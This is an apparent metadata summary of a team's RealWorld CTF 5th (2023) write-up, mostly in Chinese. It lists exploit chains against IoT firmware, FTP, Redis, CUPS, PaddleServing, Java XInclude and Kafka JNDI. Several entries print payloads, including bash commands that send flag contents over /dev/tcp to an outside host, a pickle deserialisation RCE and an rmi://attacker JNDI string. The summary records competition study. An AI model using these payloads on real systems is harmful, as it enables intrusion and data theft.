---
title: RealWorld CTF 5th Writeup by r3kapig
contest: RealWorld CTF 5th
year: 2023
difficulty: high
vuln_type: pwn_unknown
tags: [mips, iot, udp-protocol, ipfind, base64-decode, ftp, redis, redis-rocksdb-jemalloc, cups-rce, jndi-rmi, kafka-sasl, vm-instruction]
attack_chain:
  - IoT PWN: 跟 RWCTF 5th ShellFind 同源 (ipfind UDP 62720 base64 栈溢出)
  - MIPS shellcraft.open('/firmadyne/flag') + read + sendto 写回
  - PWN mips padding 580 字节 + 多个 pb32 gadget
  - FTP 攻击: PASV 拿 data port + USER/PASS anonymous + LIST/RETR 任意文件读
  - user 命令注入: USER <flag_name> 触发 ftp 用户名解析
  - Redis Jemalloc Hook: debug mallctl arena.0.extent_hooks 写 fake extent_hooks
  - 命令链: echo '#!/bin/bash' > /tmp/a + echo -n 'cmd' >> /tmp/a + chmod 777 + /tmp/a
  - extent_hooks libssl_base+0x2f3f4 触发 mov rdi,[rdi]; jmp [rdi+0x30]
  - cmd_addr+0x13 触发 (libssl_base+0x2f3f4) → extent_hooks_rdi+0x30 → cmd 字符串
  - CUPS IPP 协议 RCE: requesting-user-name 注入 ' ;bash -c 'cat /flag >&/dev/tcp/ip/port'; '
  - snprintf + system(cmdline) 触发命令执行
  - CUPS beh:/1/3/5/socket://printer:9100 后端命令注入
  - 自定义 VM: add esp 0x401de60 + pop eax + prn eax 浮点打印
  - sub eax 0x12e0bd + 0x10 找 base + add 0x20 跳 ret
  - PaddleServing RCE: np.load(byte_data, allow_pickle=True) 反序列化
  - POST /uci/prediction byte_data=pickle.dumps(RCE()) (base64)
  - Java XInclude: <arg0 xsi:type="xs:base64Binary"><xop:Include href="file:////opt/tomcat/webapps/ROOT.war"/></arg0>
  - Kafka SASL JNDI: sasl.jaas.config=com.sun.security.auth.module.JndiLoginModule rmi://attacker/EvilObject
  - LDAP 反序列化服务器 InMemoryDirectoryServer + interceptor
key_payload: cmds = ["echo '#!/bin/bash'>/tmp/a", "echo -n '/readflag>/dev/tcp/ip/port'>>/tmp/a", "chmod 777 /tmp/a", "/tmp/a"]
one_liner: RealWorld CTF 5th r3kapig 多方向 WP：IoT mips UDP 栈溢出 + FTP PASV 注入 + Redis Jemalloc extent_hooks 任意执行 + CUPS IPP 协议 RCE + 自定义 VM 浮点 + PaddleServing pickle + Java XInclude + Kafka SASL JNDI。
lesson: Redis Jemalloc extent_hooks 是 2022 后 Redis 任意执行新攻击面 (类似 tcache_perthread_struct 伪造)；CUPS IPP 协议 user-name 注入是 Linux 桌面常见 RCE 入口；PaddleServing np.load pickle 是 AI 服务常见漏洞。
quality: high
---
